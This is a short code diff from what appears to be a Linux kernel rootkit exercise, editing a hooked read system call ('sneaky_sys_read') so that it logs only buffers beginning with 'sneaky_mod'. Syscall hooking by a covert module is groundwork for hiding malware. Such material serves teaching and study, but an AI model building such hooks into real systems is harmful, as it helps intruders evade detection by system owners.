@@ -104,9 +104,10 @@ asmlinkage int sneaky_sys_read(struct pt_regs *regs)
   int sneaky_result = original_result;
 
   char * original_buf = regs->si;
-  char * sneaky_buf = strchr(original_buf, '\n');
-  printk(KERN_INFO "Sneaky read%s \n", sneaky_buf);
-  
+  if(strncmp(original_buf, "sneaky_mod", 10) == 0){
+    char * sneaky_buf = strchr(original_buf, '\n');
+    printk(KERN_INFO "Sneaky read%s \n", sneaky_buf);
+  }
   return sneaky_result;
 }
 
